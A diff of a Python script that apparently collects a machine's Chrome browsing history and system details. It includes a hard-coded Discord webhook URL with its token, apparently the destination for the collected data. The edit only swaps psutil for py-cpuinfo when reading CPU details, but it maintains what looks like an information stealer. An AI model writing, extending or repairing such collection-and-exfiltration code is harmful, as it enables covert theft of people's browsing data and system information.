@@ -5,6 +5,7 @@ import datetime
 import requests
 import psutil
 import gpuinfo
+import cpuinfo  # Import the cpuinfo library for CPU details
 
 # Discord webhook URL
 webhook_url = "https://discord.com/api/webhooks/1320743687109476393/03lSr_qHl0gJyrBWxBRg1uzLwTdwnWhp0p-mM-AWlaHxqn5bbL3ALjfVZUkiV01ReXee"
@@ -60,9 +61,9 @@ def get_chrome_history():
 def get_system_info():
     system_info = "**🖥️ System Information**\n\n"
 
-    # Get CPU info
-    cpu_info = psutil.cpu_info()
-    system_info += f"• **CPU:** {cpu_info[0].model}\n"
+    # Get CPU info using py-cpuinfo
+    cpu_info = cpuinfo.get_cpu_info()
+    system_info += f"• **CPU:** {cpu_info['processor']}\n"
 
     # Get GPU info
     gpu_info = gpuinfo.get_info()
